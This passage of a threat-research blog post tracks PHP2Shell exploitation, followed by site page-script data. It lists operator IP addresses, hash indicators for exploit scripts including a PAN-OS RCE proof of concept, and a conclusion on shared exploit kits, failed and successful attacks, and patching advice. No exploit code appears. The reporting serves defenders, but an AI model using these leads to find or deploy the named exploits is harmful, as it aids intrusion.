Exploit-development host; lab info-leak working |\n| 34.146.20[.]31 | AS396982 | Google LLC | JP | Shared 9bie kit, lab RCE |\n| 38.60.136[.]217 | AS154177 | Light Node Limited | FR | Shared 9bie kit, lab RCE |\n| 96.126.130[.]81 | AS149440 | Evoxt | JP | Shared 9bie kit (variant), lab RCE |\n| 101.133.233[.]159 | AS37963 | Alibaba Cloud | CN | Shared 9bie kit plus scanner |\n| 144.217.161[.]236 | AS16276 | OVH | CA | Staging; govt finance targets |\n| 152.42.245[.]8 | AS14061 | DigitalOcean | SG | Staging; commercial targets |\n| 23.27.25[.]75 | AS149440 | Evoxt | DE | Staging; education/commercial |\n| 130.12.180[.]89 | AS202412 | Omegatech | DE | php2shell attempted, failed; pivoted to other bug |\n| 45.225.135[.]53 | AS64107 | RACK SPHERE | NL | SMTP/XXE operator; php2shell scanner only |\n\n| File | SHA-256 |\n| --- | --- |\n| murrez php2shell poc.py | 535b9e298defd3449ba2b10b9828925d3ce344872dcbd9470c0e8db20f0aae83 |\n| shared session-LFI exploit (vcript.py / chain_a_session_lfi.py) | 6f84cc354b785157983efa8f4b674d2e1d6c3331017f29ff8d51bc43668d4b0f |\n| sc.py heap RCE | 2d692ee6dcb41c249c55881897b7dec0550b92963e07fccdb11ad655601977c3 |\n| python.py scanner | 66bcbc8c2b9d847a1e976e57972e10eac98e9b894cbf30510bff1e8d63efb81f |\n| panos_rce_poc.py | 1c93ea48fa7ff886a6d81e44869dd7962309e95d01c1561df362b0b18007a562 |\n| zr0n README | 9c15dc5a510bf2e8a16c846e61fa35c50ef733b72d4e47b6e8307498a398443c |\n| 162.35.99[.]94 poc.sql | 4a1502affa36d106d5374bf02cf777956eef651176ec8964b26ff90f103dd506 |\n| shared 9bie ASLR-bypass exploit (exploit.py, byte-identical across hosts) | c1e81cfbaf7e4cccad7d7f43c1a624b791ba1b7f1d176e224455138604837b4c |\n| 9bie kit leak tool (aslr_run.py) | 5e99d6023dce9bb18d845a37fcdbc7ea574fdb20ab8d888ec54c695382d46036 |\n\nConclusion\n----------\n\nOur investigation identified 616 files matching PHP2Shell-related indicators across indexed open directories, exposing a diverse ecosystem of exploit development, staging infrastructure, and operational tooling. We mapped multiple infrastructure clusters, identified shared exploit code across hosts, and traced how different operators were experimenting with the same vulnerabilities.\n\nWe found one exploit kit shared byte-for-byte across four hosts, with operator logs demonstrating successful command execution as www-data in laboratory environments. We also identified a separate PAN-OS-focused implementation at 130.94.67[.]235, showing how the vulnerability is being adapted to other products. We also found an operator attempting PHP2Shell against a government target, but its own logs recorded failed execution before the operator moved to a different vulnerability.\n\nThe evidence shows operators sharing tools, refining exploit chains, testing vulnerable configurations, and selecting high-value targets. It also shows that exploitation is highly dependent on the target environment, and that a working laboratory exploit does not automatically translate into reliable RCE on arbitrary production systems. Against a uniform stack like PAN-OS management, it translated into confirmed root on internet-facing firewalls.\n\nFor defenders, that makes the response the boring one, and the right one: patch to a supported PHP build, patch or restrict PAN-OS management interfaces, and keep eyes on internet-facing PHP. On the open web the mass wave has not arrived. Against PAN-OS it already has. The behavioral signatures above are enough to catch attempts today.\n\n__We will keep tracking this infrastructure as it moves, and our open-directory data is usually where a real shift surfaces first. You can follow the same hosts in [AttackCapture™](https://hunt.io/features/attackcapture), or [book a walkthrough](https://hunt.io/get-started) to see how we map them.__",{"type":6,"value":100},"php2shell-honeypot-shells-root-palo-alto-firewalls",{"type":6,"value":102},"AH0lanNlT","{\"from\":\"89db1b98-9697-4ae2-b670-96ac6e551fd7\",\"orderBy\":[{\"arguments\":[{\"type\":\"LiteralValue\",\"value\":[\"YQHce02w9\"]},{\"collection\":\"ibWdRTqbO\",\"name\":\"id\",\"type\":\"Identifier\"}],\"direction\":\"asc\",\"functionName\":\"INDEX_OF\",\"type\":\"FunctionCall\"}],\"select\":[{\"collection\":\"ibWdRTqbO\",\"name\":\"rIUuE9tcO\",\"type\":\"Identifier\"},{\"collection\":\"ibWdRTqbO\",\"name\":\"q0evBgI2k\",\"type\":\"Identifier\"},{\"collection\":\"ibWdRTqbO\",\"name\":\"id\",\"type\":\"Identifier\"}],\"where\":{\"left\":{\"collection\":\"ibWdRTqbO\",\"name\":\"id\",\"type\":\"Identifier\"},\"operator\":\"in\",\"right\":{\"type\":\"LiteralValue\",\"value\":[\"YQHce02w9\"]},\"type\":\"BinaryOperation\"}}default",[105],{"rIUuE9tcO":106,"q0evBgI2k":108,"id":54},{"type":6,"value":107},"Threat Research",{"type":6,"value":109},"threat-research","{\"from\":\"89db1b98-9697-4ae2-b670-96ac6e551fd7\",\"limit\":{\"type\":\"LiteralValue\",\"value\":10},\"orderBy\":[{\"arguments\":[{\"type\":\"LiteralValue\",\"value\":[\"YQHce02w9\"]},{\"collection\":\"Sk0irttUs\",\"name\":\"id\",\"type\":\"Identifier\"}],\"direction\":\"asc\",\"functionName\":\"INDEX_OF\",\"type\":\"FunctionCall\"}],\"select\":[{\"collection\":\"Sk0irttUs\",\"name\":\"rIUuE9tcO\",\"type\":\"Identifier\"},{\"collection\":\"Sk0irttUs\",\"name\":\"q0evBgI2k\",\"type\":\"Identifier\"},{\"collection\":\"Sk0irttUs\",\"name\":\"id\",\"type\":\"Identifier\"}],\"where\":{\"left\":{\"collection\":\"Sk0irttUs\",\"name\":\"id\",\"type\":\"Identifier\"},\"operator\":\"in\",\"right\":{\"type\":\"LiteralValue\",\"value\":[\"YQHce02w9\"]},\"type\":\"BinaryOperation\"}}default",[112],{"rIUuE9tcO":106,"q0evBgI2k":108,"id":54},"{\"from\":\"5b7016cf-ec54-4bbb-8513-dc63e4aa31e7\",\"orderBy\":[{\"arguments\":[{\"type\":\"LiteralValue\",\"value\":[]},{\"collection\":\"s76WfWvKk\",\"name\":\"id\",\"type\":\"Identifier\"}],\"direction\":\"asc\",\"functionName\":\"INDEX_OF\",\"type\":\"FunctionCall\"}],\"select\":[{\"collection\":\"s76WfWvKk\",\"name\":\"K0Fppwv0V\",\"type\":\"Identifier\"},{\"collection\":\"s76WfWvKk\",\"name\":\"gh89jEZuN\",\"type\":\"Identifier\"},{\"collection\":\"s76WfWvKk\",\"name\":\"id\",\"type\":\"Identifier\"}],\"where\":{\"left\":{\"collection\":\"s76WfWvKk\",\"name\":\"id\",\"type\":\"Identifier\"},\"operator\":\"in\",\"right\":{\"type\":\"LiteralValue\",\"value\":[]},\"type\":\"BinaryOperation\"}}default",[],"{\"from\":\"53d63199-6fdf-4d05-b648-f4558be8eab6\",\"orderBy\":[{\"arguments\":[{\"type\":\"LiteralValue\",\"value\":[]},{\"collection\":\"UGLvccyAe\",\"name\":\"id\",\"type\":\"Identifier\"}],\"direction\":\"asc\",\"functionName\":\"INDEX_OF\",\"type\":\"FunctionCall\"}],\"select\":[{\"collection\":\"UGLvccyAe\",\"name\":\"EspEaJxrx\",\"type\":\"Identifier\"},{\"collection\":\"UGLvccyAe\",\"name\":\"gfbltFxnp\",\"type\":\"Identifier\"},{\"collection\":\"UGLvccyAe\",\"name\":\"id\",\"type\":\"Identifier\"}],\"where\":{\"left\":{\"collection\":\"UGLvccyAe\",\"name\":\"id\",\"type\":\"Identifier\"},\"operator\":\"in\",\"right\":{\"type\":\"LiteralValue\",\"value\":[]},\"type\":\"BinaryOperation\"}}default",[],"{\"from\":\"3ba6eb88-f096-4ecb-bdfd-aed60932d9bc\",\"orderBy\":[{\"arguments\":[{\"type\":\"LiteralValue\",\"value\":[]},{\"collection\":\"McA1wsMbl\",\"name\":\"id\",\"type\":\"Identifier\"}],\"direction\":\"asc\",\"functionName\":\"INDEX_OF\",\"type\":\"FunctionCall\"}],\"select\":[{\"collection\":\"McA1wsMbl\",\"name\":\"WTvHdzox8\",\"type\":\"Identifier\"},{\"collection\":\"McA1wsMbl\",\"name\":\"ii_KNOz7J\",\"type\":\"Identifier\"},{\"collection\":\"McA1wsMbl\",\"name\":\"id\",\"type\":\"Identifier\"}],\"where\":{\"left\":{\"collection\":\"McA1wsMbl\",\"name\":\"id\",\"type\":\"Identifier\"},\"operator\":\"in\",\"right\":{\"type\":\"LiteralValue\",\"value\":[]},\"type\":\"BinaryOperation\"}}default",[],"{\"from\":\"161da198-b169-478d-8a3f-dc8e9077bc88\",\"orderBy\":[{\"arguments\":[{\"type\":\"LiteralValue\",\"value\":[]},{\"collection\":\"fk6qrb6AW\",\"name\":\"id\",\"type\":\"Identifier\"}],\"direction\":\"asc\",\"functionName\":\"INDEX_OF\",\"type\":\"FunctionCall\"}],\"select\":[{\"collection\":\"fk6qrb6AW\",\"name\":\"K_4_kEKvF\",\"type\":\"Identifier\"},{\"collection\":\"fk6qrb6AW\",\"name\":\"xv9bkVJdS\",\"type\":\"Identifier\"},{\"collection\":\"fk6qrb6AW\",\"name\":\"id\",\"type\":\"Identifier\"}],\"where\":{\"left\":{\"collection\":\"fk6qrb6AW\",\"name\":\"id\",\"type\":\"Identifier\"},\"operator\":\"in\",\"right\":{\"type\":\"LiteralValue\",\"value\":[]},\"type\":\"BinaryOperation\"}}default",[],"{\"from\":\"b4e4cbbd-1976-46a4-921b-9a660ffdfd0d\",\"limit\":{\"type\":\"LiteralValue\",\"value\":1},\"select\":[{\"collection\":\"KzzWy6ucC\",\"name\":\"vtwmcCRW2\",\"type\":\"Identifier\"},{\"collection\":\"KzzWy6ucC\",\"name\":\"DOVcfCiBY\",\"type\":\"Identifier\"},{\"collection\":\"KzzWy6ucC\",\"name\":\"id\",\"type\":\"Identifier\"}],\"where\":{\"left\":{\"collection\":\"KzzWy6ucC\",\"name\":\"id\",\"type\":\"Identifier\"},\"operator\":\"==\",\"right\":{\"type\":\"LiteralValue\"},\"type\":\"BinaryOperation\"}}default",[],"{\"from\":\"4304de0f-b5d3-4ae3-9b63-6ce43cef57ef\",\"limit\":{\"type\":\"LiteralValue\",\"value\":1},\"orderBy\":[{\"collection\":\"mMSdo_O5C\",\"direction\":\"desc\",\"name\":\"de1R1GSeH\",\"type\":\"Identifier\"}],\"select\":[{\"collection\":\"mMSdo_O5C\",\"name\":\"iDOu5XxRP\",\"type\":\"Identifier\"},{\"collection\":\"mMSdo_O5C\",\"name\":\"EElOb1aRp\",\"type\":\"Identifier\"},{\"collection\":\"mMSdo_O5C\",\"name\":\"id\",\"type\":\"Identifier\"}],\"where\":{\"left\":{\"collection\":\"mMSdo_O5C\",\"name\":\"FG1uuviJh\",\"type\":\"Identifier\"},\"operator\":\"and\",\"right\":{\"operator\":\"not\",\"type\":\"UnaryOperation\",\"value\":{\"left\":{\"collection\":\"mMSdo_O5C\",\"name\":\"iDOu5XxRP\",\"type\":\"Identifier\"},\"operator\":\"==\",\"right\":{\"type\":\"LiteralValue\",\"value\":\"cve-2026-25253-openclaw-ai-agent-exposure\"},\"type\":\"BinaryOperation\"}},\"type\":\"BinaryOperation\"}}default",[125],{"iDOu5XxRP":60,"EElOb1aRp":43,"id":62},["Map"]]</script><div id="svg-templates" style="position: absolute; overflow: hidden; bottom: 0; left: 0; width: 0; height: 0; z-index: 0; contain: strict" aria-hidden="true">
